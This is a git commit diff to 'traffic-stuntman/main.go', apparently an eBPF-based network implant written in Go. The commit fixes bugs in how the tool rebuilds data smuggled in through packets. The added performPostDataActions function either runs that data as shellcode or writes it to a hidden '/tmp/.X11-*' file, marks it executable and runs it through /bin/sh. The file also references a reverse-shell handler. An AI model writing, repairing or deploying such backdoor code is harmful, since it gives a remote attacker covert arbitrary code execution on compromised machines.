2fa535f2619d618dea6da88e12729129c30563e0
edcod3 <31140082+edcod3@users.noreply.github.com>
2026-01-08 01:09:09 +0000

    Fix data handling issues

--- traffic-stuntman/main.go
+++ traffic-stuntman/main.go
@@ -2,6 +2,8 @@ package main
 
 import (
 	"encoding/binary"
+	"errors"
+	"flag"
 	"fmt"
 	"log"
 	"net"
@@ -26,6 +28,8 @@ type Data struct {
 	exec     bool
 }
 
+var verbose *bool
+
 var conns map[string]bool = make(map[string]bool)
 
 var datas map[string]Data = make(map[string]Data)
@@ -36,7 +40,9 @@ func displayCounter(objs traffic_testObjects) {
 	if err != nil {
 		log.Fatal("(count) Map lookup:", err)
 	}
-	log.Printf("Received %d packets", count.Offset)
+	if *verbose {
+		log.Printf("Received %d packets", count.Offset)
+	}
 }
 
 func int2ip(nn uint32) net.IP {
@@ -74,6 +80,47 @@ func getRevshell(objs traffic_testObjects) {
 	}
 }
 
+func performPostDataActions(data Data) {
+
+	if !data.done {
+		return
+	}
+
+	if !data.save && data.exec {
+		execShellcode(data.data)
+	}
+
+	if data.save {
+		fp, err := os.CreateTemp("/tmp", ".X11-*")
+		if err != nil {
+			log.Fatalf("[DATA-CREATE] exec+save: %s", err)
+		}
+		fp.Write(data.data)
+		fp.Close()
+
+		fmt.Printf("[SAVE] Data from '%s' saved to '%s'\n", data.host.String(), fp.Name())
+
+		if data.exec {
+			err = os.Chmod(fp.Name(), os.FileMode(0700))
+			if err != nil {
+				log.Fatalf("[FILE-CHMOD] exec+save: %s", err)
+			}
+			if _, err := os.Stat(fp.Name()); errors.Is(err, os.ErrNotExist) {
+				log.Fatalf("[FILE-EXISTS] exec+save: %s", err)
+			}
+			go func() {
+				fmt.Printf("[SAVE] Executing \"/bin/sh -c '%s'\"\n", fp.Name())
+				cmd := exec.Command("/bin/sh", "-c", fp.Name())
+				err := cmd.Run()
+				if err != nil {
+					fmt.Printf("[ERROR] Fail in DATA save+exec for '%s': %s\n", data.host.String(), err)
+				}
+			}()
+		}
+
+	}
+}
+
 func parseDataAttrs(data Data) Data {
 	switch data.port {
 	case 1:
@@ -91,13 +138,17 @@ func getData(objs traffic_testObjects) {
 	var data Data
 	err := objs.TrafficOps.Lookup(uint32(2), &data_obj)
 	if err != nil {
-		log.Fatal("(revshell) Map lookup:", err)
+		log.Fatal("(data) Map lookup: ", err)
+	}
+
+	if *verbose {
+		fmt.Printf("Got data obj: %+v\n", data_obj)
 	}
 
 	if data_obj.Data != 0 {
 		if data_obj.Offset == 0 {
 			data_bytes := make([]byte, 4)
-			binary.LittleEndian.PutUint32(data_bytes, data_obj.Data)
+			binary.BigEndian.PutUint32(data_bytes, data_obj.Data)
 			data = Data{
 				host:     int2ip(data_obj.Host),
 				port:     data_obj.Port,
@@ -107,58 +158,60 @@ func getData(objs traffic_testObjects) {
 				filename: "",
 				exec:     false,
 			}
-			fmt.Println("Got new data packet from: " + data.host.String())
 			data = parseDataAttrs(data)
-			datas[data.host.String()] = data
+			if *verbose {
+				fmt.Printf("Got new data packet from '%s': %+v\n'", data.host.String(), data)
+			}
+			if data.done {
+				performPostDataActions(data)
+			} else {
+				datas[data.host.String()] = data
+			}
 		} else if data_obj.Offset > 0 {
 			host := int2ip(data_obj.Host).String()
 			if data, exists := datas[host]; exists {
-				fmt.Println("Got existing data packet from: " + host)
-				data.port = data_obj.Port
-				data_bytes := make([]byte, 4)
-				binary.LittleEndian.PutUint32(data_bytes, data_obj.Data)
-				data.data = append(data.data, data_bytes...)
-				data = parseDataAttrs(data)
+				if data_obj.Offset == uint32(len(data.data)-4) {
+					if *verbose {
+						fmt.Println("Offsets match: already have this packet! Continuing...")
+					}
+				} else {
+					data.port = data_obj.Port
+					data_bytes := make([]byte, 4)
+					binary.BigEndian.PutUint32(data_bytes, data_obj.Data)
+					data.data = append(data.data, data_bytes...)
+					data = parseDataAttrs(data)
+					if *verbose {
+						fmt.Printf("Got existing data packet from '%s': %+v\n'", data.host.String(), data)
+					}
+					if data.done {
+						performPostDataActions(data)
+						delete(datas, data.host.String())
+					} else {
+						datas[data.host.String()] = data
+					}
+				}
 			}
 		}
 
-		if data.done {
-			if data.save {
-				fp, err := os.CreateTemp("/tmp", ".X11-*")
-				if err != nil {
-					log.Fatalf("[DATA] exec+save: %s", err)
-				}
-				fp.Write(data.data)
-				fp.Close()
-
-				fmt.Printf("[SAVE] Data from '%s' saved to '%s'\n", data.host.String(), fp.Name())
-
-				if data.exec {
-					command := "/bin/sh -c '" + fp.Name() + "'"
-					fmt.Printf("[SAVE] Executing \"%s\"\n", command)
-					go func() {
-						cmd := exec.Command(command)
-						err := cmd.Run()
-						if err != nil {
-							fmt.Printf("[ERROR] Fail in DATA save+exec for '%s': %s\n", data.host.String(), err)
-						}
-					}()
-				}
-
-			} else if data.exec {
-				execShellcode(data.data)
-			}
-		}
 	}
 }
 
 func main() {
-	if len(os.Args) < 2 {
-		log.Fatalf("Please specify a network interface")
+
+	verbose = flag.Bool("v", false, "enable verbose output")
+	flag.Parse()
+
+	// Positional arguments
+	args := flag.Args()
+
+	if len(args) < 1 {
+		fmt.Fprintf(os.Stderr, "usage: %s iface [-v]\n", os.Args[0])
+		os.Exit(1)
 	}
 
+	ifaceName := args[0]
+
 	// Look up the network interface by name.
-	ifaceName := os.Args[1]
 	iface, err := net.InterfaceByName(ifaceName)
 	if err != nil {
 		log.Fatalf("lookup network iface %q: %s", ifaceName, err)
